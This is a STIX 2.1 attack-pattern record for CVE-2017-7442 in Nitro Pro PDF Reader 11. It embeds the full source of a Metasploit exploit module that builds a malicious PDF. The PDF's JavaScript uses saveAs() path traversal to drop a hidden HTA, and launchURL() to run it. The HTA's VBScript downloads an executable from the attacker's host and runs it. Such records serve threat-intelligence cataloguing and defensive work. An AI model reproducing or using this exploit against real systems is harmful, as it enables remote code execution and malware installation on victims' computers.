{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--600fd50f-adb8-423e-a203-0b6eb36a8a42",
    "created": "2024-08-14T16:38:25.463371Z",
    "modified": "2024-08-14T16:38:25.463374Z",
    "name": "Nitro Pro PDF Reader 11.0.3.173 Javascript API Remote Code Execution",
    "description": " This module exploits an unsafe Javascript API implemented in Nitro and Nitro Pro PDF Reader version 11. The saveAs() Javascript API function allows for writing",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/nitro_reader_jsapi.rb",
            "external_id": "nitro_reader_jsapi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7442"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Nitro Pro PDF Reader 11.0.3.173 Javascript API Remote Code Execution',\n      'Description'    => %q{\n          This module exploits an unsafe Javascript API implemented in Nitro and Nitro Pro\n          PDF Reader version 11. The saveAs() Javascript API function allows for writing\n          arbitrary files to the file system. Additionally, the launchURL() function allows\n          an attacker to execute local files on the file system and bypass the security dialog\n\n          Note: This is 100% reliable.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'mr_me <steven[at]srcincite.io>',         # vulnerability discovery and exploit\n        'bcoles',                                 # hidden hta tricks!\n        'sinn3r'                                  # help with msf foo!\n      ],\n      'References'     =>\n        [\n          [ 'CVE', '2017-7442' ],\n          [ 'URL', 'http://srcincite.io/advisories/src-2017-0005/' ],           # public advisory #1\n          [ 'URL', 'https://blogs.securiteam.com/index.php/archives/3251' ],    # public advisory #2 (verified and acquired by SSD)\n        ],\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => false\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # truly universal\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => '2017-07-24',\n      'DefaultTarget'  => 0))\n\n      register_options([\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ]),\n      ])\n      deregister_options('SSL', 'SSLVersion', 'SSLCert')\n  end\n\n  def build_vbs(url, stager_name)\n    name_xmlhttp  = rand_text_alpha(2)\n    name_adodb    = rand_text_alpha(2)\n    vbs           = %Q|<head><hta:application\n    applicationname=\"#{@payload_name}\"\n    border=\"none\"\n    borderstyle=\"normal\"\n    caption=\"false\"\n    contextmenu=\"false\"\n    icon=\"%SystemRoot%/Installer/{7E1360F1-8915-419A-B939-900B26F057F0}/Professional.ico\"\n    maximizebutton=\"false\"\n    minimizebutton=\"false\"\n    navigable=\"false\"\n    scroll=\"false\"\n    selection=\"false\"\n    showintaskbar=\"No\"\n    sysmenu=\"false\"\n    version=\"1.0\"\n    windowstate=\"Minimize\"></head>\n    <style>* { visibility: hidden; }</style>\n    <script language=\"VBScript\">\n    window.resizeTo 1,1\n    window.moveTo -2000,-2000\n    </script>\n    <script type=\"text/javascript\">setTimeout(\"window.close()\", 5000);</script>\n    <script language=\"VBScript\">\n    On Error Resume Next\n    Set #{name_xmlhttp} = CreateObject(\"Microsoft.XMLHTTP\")\n    #{name_xmlhttp}.open \"GET\",\"http://#{url}\",False\n    #{name_xmlhttp}.send\n    Set #{name_adodb} = CreateObject(\"ADODB.Stream\")\n    #{name_adodb}.Open\n    #{name_adodb}.Type=1\n    #{name_adodb}.Write #{name_xmlhttp}.responseBody\n    #{name_adodb}.SaveToFile \"C:#{@temp_folder}/#{@payload_name}.exe\",2\n    set shellobj = CreateObject(\"wscript.shell\")\n    shellobj.Run \"C:#{@temp_folder}/#{@payload_name}.exe\",0\n    </script>|\n    vbs.gsub!(/    /,'')\n    return vbs\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri =~ /\\.exe/\n      print_status(\"Sending second stage payload\")\n      return if ((p=regenerate_payload(cli)) == nil)\n      data = generate_payload_exe( {:code=>p.encoded} )\n      send_response(cli, data, {'Content-Type' => 'application/octet-stream'} )\n      return\n    end\n  end\n\n  def exploit\n    # In order to save binary data to the file system the payload is written to a .vbs\n    # file and execute it from there.\n    @payload_name = rand_text_alpha(4)\n    @temp_folder  = \"/Windows/Temp\"\n    register_file_for_cleanup(\"C:#{@temp_folder}/#{@payload_name}.hta\")\n    if datastore['SRVHOST'] == '0.0.0.0'\n      lhost = Rex::Socket.source_address('50.50.50.50')\n    else\n      lhost = datastore['SRVHOST']\n    end\n    payload_src  = lhost\n    payload_src << \":#{datastore['SRVPORT']}#{datastore['URIPATH']}#{@payload_name}.exe\"\n    stager_name = rand_text_alpha(6) + \".vbs\"\n    pdf = %Q|%PDF-1.7\n    4 0 obj\n    <<\n    /Length 0\n    >>\n    stream\n    |\n    pdf << build_vbs(payload_src, stager_name)\n    pdf << %Q|\n    endstream endobj\n    5 0 obj\n    <<\n    /Type /Page\n    /Parent 2 0 R\n    /Contents 4 0 R\n    >>\n    endobj\n    1 0 obj\n    <<\n    /Type /Catalog\n    /Pages 2 0 R\n    /OpenAction [ 5 0 R /Fit ]\n      /Names <<\n        /JavaScript <<\n          /Names [ (EmbeddedJS)\n            <<\n              /S /JavaScript\n              /JS (\n                    this.saveAs('../../../../../../../../../../../../../../../..#{@temp_folder}/#{@payload_name}.hta');\n                    app.launchURL('c$:/../../../../../../../../../../../../../../../..#{@temp_folder}/#{@payload_name}.hta');\n              )\n            >>\n          ]\n        >>\n      >>\n    >>\n    endobj\n    2 0 obj\n    <</Type/Pages/Count 1/Kids [ 5 0 R ]>>\n    endobj\n    3 0 obj\n    <<>>\n    endobj\n    xref\n    0 6\n    0000000000 65535 f\n    0000000166 00000 n\n    0000000244 00000 n\n    0000000305 00000 n\n    0000000009 00000 n\n    0000000058 00000 n\n    trailer <<\n    /Size 6\n    /Root 1 0 R\n    >>\n    startxref\n    327\n    %%EOF|\n    pdf.gsub!(/    /,'')\n    file_create(pdf)\n    super\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-07-24",
    "x_mitre_platforms": [
        "win'"
    ]
}